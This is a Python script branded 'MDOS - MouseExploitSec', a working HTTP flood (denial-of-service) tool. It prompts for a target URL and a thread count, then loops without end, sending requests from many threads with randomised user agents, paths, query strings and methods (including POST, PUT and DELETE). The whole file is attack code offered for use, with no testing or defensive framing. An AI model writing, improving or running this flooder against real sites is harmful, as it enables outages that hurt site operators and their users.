import requests
import random
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import time

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

RANDOM_PATHS = [
    "/", "/about", "/contact", "/products", "/services", "/login", "/search", "/checkout"
]

def format_url(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url.rstrip("/")

def send_request(target_url):
    try:
        headers = {"User-Agent": random.choice(USER_AGENTS)}
        path = random.choice(RANDOM_PATHS)
        url = target_url + path
        random_query = f"?id={random.randint(1, 100000)}&ref={random.randint(1, 1000)}"
        url += random_query
        method = random.choice(["GET", "POST", "PUT", "DELETE"])
        
        with requests.Session() as session:
            if method == "GET":
                response = session.get(url, headers=headers)
            elif method == "POST":
                response = session.post(url, headers=headers, data={"key": "value"})
            elif method == "PUT":
                response = session.put(url, headers=headers, data={"key": "value"})
            elif method == "DELETE":
                response = session.delete(url, headers=headers)

            if response.status_code != 200:
                print(Fore.RED + f"{url} Status DOWN (Code: {response.status_code})")
            else:
                print(f"Request {method} sent to {url} | Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: {e}")

def http_attack(target_url, thread_count):
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        while True:
            for _ in range(thread_count):
                executor.submit(send_request, target_url)
            time.sleep(0.1)

if __name__ == "__main__":
    print(Fore.CYAN + '''
   *    (        )  (     
 (  `   )\ )  ( /(  )\ )  
 )\))( (()/(  )\())(()/(  
((_)()\ /(_))((_)\  /(_)) 
(_()((_|_))_   ((_)(_))   
|  \/  ||   \ / _ \/ __|  
| |\/| || |) | (_) \__ \  
|_|  |_||___/ \___/|___/  
>> MDOS - MouseExploitSec
    ''')
    target_url = input("Enter Target URL: ").strip()
    thread_count = int(input("Enter Number of Threads: "))
    target_url = format_url(target_url)

    try:
        http_attack(target_url, thread_count)
    except KeyboardInterrupt:
        print("\nAttack stopped by the user.")
